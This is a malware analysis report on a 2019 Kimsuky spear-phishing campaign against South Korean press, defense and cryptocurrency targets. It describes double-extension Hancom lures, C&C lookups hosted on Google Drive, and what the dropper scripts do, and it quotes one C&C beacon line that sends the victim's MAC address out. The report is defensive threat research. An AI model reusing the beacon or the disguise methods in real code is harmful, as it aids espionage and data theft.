Analysis Report_Operation Kabar Cobra

Executive Summary
On January 7, 2019, a spear-phishing email with a malicious attachment was sent to members of the Ministry
of Unification press corps. The perpetrators behind the mail and malware are assumed to be the so-called
Kimsuky threat group or Kimsuky group.

Kimsuky group was first identified in 2013, when the Russian security company Kaspersky Lab released a
report analyzing a cyber-espionage campaign by the group. The name derives from the email account,
“Kimsukyang,” which was used as drop-point for stolen data at the time.

Since 2013, Kimsuky group has continued a cyber-attack campaign against government organizations and
defense-related agencies in South Korea as well as institutions and corporations related to South Korea’s
engagement with North Korea. After the January 2019 spear-phishing attack, more activity by the Kimsuky
group was detected in February 2019 during the period ahead of the second U.S.-North Korea summit in Hanoi.

In the meantime, notable signs point to an expanded target list that includes financial firms and cryptocurrency
organizations along with the political sector. As North Korea’s economic situation continues to deteriorate due
to ongoing sanctions, the attackers appear to be aiming for financial gains in addition to its political agenda.

This report presents a detailed analysis on the series of recent attacks, of which the Kimsuky group has been
suspected, and the reasons for concluding that the group is the perpetrator.

Introduction: Operation Kabar Cobra
With the Kimsuky group mounting a sustained campaign of attacks against South Korea’s defense-related
organizations and media companies, the attackers were recently found targeting a number of enterprises
including those dealing in cryptocurrencies for financial gain. A spate of malware was distributed with the file
name “Cobra” and a mutex called “KABAR” were identified in several of the attacks.

Figure 1. Mutex string included in the malicious code
Based on these findings, the security researchers at AhnLab Security Emergency Response Center (ASEC)
suspect that the recent wave of attacks originated from the Kimsuky group and have named it “Operation
Kabar Cobra.”

Analysis of the Malware
1. Malware Functions and Operations
Table 1 provides a summary of verified malware attacks (droppers) and their targets by Kimsuky from
December 2018 to January 2019. In order to deceive its victims, the attacker used a Hancom Office file (.hwp),
which is a widely used word processing program in South Korea. Note that the date of discovery of the files in
Table 1 and the actual date of their drop may be different.

Table 1. Dropper file name and type for each target

The attacker disguised the dropper with a Hancom Office file icon and used a double extension including .hwp
for the file name. As shown in Table 1, a blank was inserted between the two extensions to make it difficult to
recognize the files as an executable (.exe) or screen saver (.scr). Clicking on the files displays content that
appears to be a regular .hwp document file being opened. To add a further layer of deception, the file’s content
is disguised so as to appear to reflect a topic that could reasonably appear in the target’s regular line of work.

An in-depth analysis of the malware that was sent out in the early morning hours of January 7 to the Ministry
of Unification (MoU) press corps is shown in Table 1; it explains features and functions of the Operation Kabar
Cobra malware and how they operate.

The email sent to members of the MoU press corps bears the subject “TF reference materials” with a zipped
file attachment titled “TF 참고.zip” (The file name can be translated to “TF reference.zip”). As noted in Figure

2, the attachment contains a seemingly ordinary PDF file and a malicious file with a double extension
(*.hwp[blank].exe)

Figure 2. Malware distributed to press corps members

This malware is identical in form to the attack against defense institutions in Table 1, with both cases involving
malware disguised as a Hancom Office file (.hwp) and compressed with self-extraction (WinRAR SFX).
Running the zipped file will extract the file and run the malware, which then proceeds to initiate the actual
malicious activity. In addition, C&C information is acquired from the attacker’s Google Drive. The functions of
the malware shown in Figure 2 are as follows:

(1) 2.wsf
2.wsf downloads and runs additional malware. The necessary C&C information is downloaded from the
attacker’s Google Drive storage.

Figure 3. Downloading C&C information from the attacker’s Google Drive address

The file stored in the attacker’s Google Drive is shown in Figure 4, and includes the C&C information for
downloading the malware. The file could be altered at any time by the attacker. Malware that acts as a dropper
usually contain hardcoded C&C information. If the C&C server is shut down, the attacker then has to go through
the hassle of rewriting and distributing new malware. In this instance, however, even if the C&C server is
blocked, the attacker merely needs to change the file in the Google Drive, from which the malware can receive
instructions on connecting to a new C&C server and continue its nefarious actions.

Figure 4. File stored in the attacker’s Google Drive

Note that the email address (countine.protector.mail@gmail.com) shown in the lower part of Figure 4 had been
previously used to send phishing email. An advisory notice related to this was sent out in 2018 by the Education
Cyber Security Center (ECSC) in South Korea.

The malware (brave.ct) downloaded by 2.wsf is decrypted in the process shown in Figure 5, and the file
Freedom.dll created in the process is executed via PowerShell. If the infected PC is running in a 64-bit
Windows environment, another file named AhnLabMon.dll is created.

Figure 5. Executing the additionally-downloaded malware

(2) 3.wsf
Like 2.wsf, 3.wsf downloads C&C information from the file stored in the attacker’s Google Drive. However,
while 2.wsf serves as a dropper that downloads and runs additional malware, 3.wsf carries out a variety of
functions including deleting, downloading, and uploading files; running commands, transmitting logs, and
updating 3.wsf itself; and BASE64 encrypting and decrypting the files being sent to and from the C&C server.

Analysis Report_Operation Kabar Cobra

Connecting to the C&C server was still available when AhnLab’s researchers began their investigation, which
helped them understand how 3.wsf communicates with the C&C server and what commands are sent. Before
carrying out its malicious activities, 3.wsf first receives its version information from the C&C server and
compares it to its own version number being executed on the infected PC. If the version on the C&C server is
higher, the latest version of 3.wsf is downloaded and executed, as shown in Figure 6.

Figure 6. Comparing and updating the 3.wsf file’s version

In the particular case that AhnLab investigated, 3.wsf downloaded its 1.2 version from the C&C server as
shown in Figure 7.

Figure 7. The version information of 3.wsf downloaded from the C&C server

After checking the version information, 3.wsf receives commands from the C&C server and writes the following
parameters to carry out its functions. It sends a GET request to the C&C server, then receives and executes
the command encrypted in BASE64.

- Parameters when connecting to the C&C server for commands:
xhr.open(GET,serverurl+/board.php?m=+MAC_ADDR+&v=+VERSION+|+TIMEOUT,false);
xhr.send();
As shown above, the attacker includes the version of 3.wsf in the parameters sent to the C&C server in order
to check the current version of 3.wsf running on the infected PC so that the attacker can identify how many
systems are infected by each version.

Figure 8 shows part of the communication taking place between 3.wsf and its C&C server; it reveals how 3.wsf
receives and execute the commands to download the list.dll file from the C&C server. However, 3.wsf does not

Analysis Report_Operation Kabar Cobra

contain the codes for executing the downloaded list.dll (or Cobra.dll). Instead, Freedom.dll (or AhnLabMon.dll),
which is downloaded by 2.wsf, is confirmed to download and execute the same list.dll (Cobra.dll). Freedom.dll
(AhnLabMon.dll) downloaded by 2.wsf calls DeleteUrlCacheEntryA() function to eliminate any trace that it
downloaded the list.dll file in order to prevent being tracked.

Figure 8. Downloading the malware via C&C server communication

The list.dll (or Cobra.dll) file downloaded via communication with C&C server as shown in Figure 8 collects the
system information and a list of folders and files, and copies compressed files in the infected system. With the
collected information, the attacker is able to determine whether the infected PC is a system that analyzes
malware. If the infected PC is confirmed to be a system that analyzes malware, then the malware shuts down
the analysis program and plants false flags in order to elude tracking

2. Malware Profiling
There were attacks targeting an apparel company and cryptocurrencies in South Korea while the attack against
military-related organizations and the media industry listed in Table 1 were taking place. These attacks may
seem unrelated; however, similarities in malware were identified including the fact that the malware were
distributed from the same C&C server. The analysis of the timestamps in the related files also revealed that
the attackers have been periodically creating variant strains since at least two years ago.
Through malware profiling, AhnLab’s security researchers revealed that the attacks against the apparel
company and cryptocurrencies were indeed related to Operation Kabar Cobra, and that Kimsuky was behind
these attacks. A considerable body of evidence was accumulated, of which only the key summary is provided
below.

(1) Malware distribution method
The malware are distributed in similar ways. A disguised document to lure the victim is accompanied by
malicious scripts in the form of a WinRAR SFX (self-extracting archive). In the attacks targeting
cryptocurrencies, for example, a file disguised as an Excel file containing Ethereum transactions was used; in
the attacks against the apparel company, an Excel file masquerading as a quote and written in simplified

Analysis Report_Operation Kabar Cobra

Chinese was employed, as shown in Figure 9.

Figure 9. Excel file disguised as a quote

However, differences were spotted in how the C&C information was downloaded. In the attacks against military
agencies and the media industry, C&C information was downloaded from the attacker’s Google Drive; in the
attack against cryptos, downloading C&C information with the malicious script (2.wsf, 3.wsf) was skipped and
the C&C server was listed in a variable named server url.

(2) Malware source and C&C server
The source of the malware and the C&C server, which have been identified by AhnLab’s security researchers,
point to a single IP that is connected to a number of URLs. These URLs hijack the well-known names of Google,
Microsoft, and representative portals and key cyber security companies in South Korea, including AhnLab. The
attacker used these URLs to distribute malware or as phishing sites and C&C servers.

(3) Shellcodes
A comparison of the disguised malicious Hancom Office files used by Kimsuky in the 2014 and in 2018 attacks
revealed the fact that the same shellcodes exist in both files as shown in Figure 10. The upper part of Figure
10 is the HWP file distributed in 2014, which has a file name that translates to “2014_ Design changes of Hanul
nuclear reactor No. 1 and 2” in Korean; the bottom part of the Figure 10 is the HWP file distributed in 2018,
which has the file name that translates to “2018_Declaration of the end of Korean war.”

The left section in Figure 10 compares the two shellcodes; the grey area indicates the overlapping codes of
both files, indicating these two malware have the same shellcodes.

Figure 10. Shellcodes of the malicious files from 2014 (top) and 2018 (bottom)

(4) Operational process of offspring malware
The disguised malicious Hancom Office files created in 2017 and 2018 both created a malicious file named
core.dll. Both core.dll files used different files to run themselves, rundll32.exe and regsvr32.exe respectively,
but the codes are identical. In addition, both core.dll’s shut down the process if the program used to run
themselves was determined to be notepad.exe.

The decryption key pattern that the both core.dll’s used to decrypt the encrypted string shows they are identical:
32-byte patterns in 4-byte components. Also, the codes show that both core.dll’s used to decrypt the encrypted
string are very similar though they are not completely identical. Moreover, both core.dll’s have malicious scripts
that make the codes and the way they execute are identical to those attacks examined above.

Analysis Report_Operation Kabar Cobra

Conclusion
There following is clear evidence that Kimsuky is responsible for a series of recent attacks targeting South
Korean companies and institutions: the identical shellcodes; malware that share the same codes and operating
processes; and the generation of identical additional malware and identical IP for connecting to the same C&C
server. In addition to evading detection by security solutions with encrypted files, Kimsuky uses various
techniques such as self-deletion and variable file names to elude security researchers.

Yet, there is a noticeable factor to which we should pay attention. Kimsuky, having showed such deviousness,
used the same Hancom Office vulnerabilities and shellcodes used in the earlier 2014 attacks. It reveals that
Kimsuky is well aware of the fact that targets continue to use outdated versions of Hancom Office without
applying basic security updates.
In this regard, it is highly recommended that organizations and companies be vigilant in keeping their assets
updated. In addition, organizations and companies should obtain full visibility into their internal systems to
detect and track security breaches.
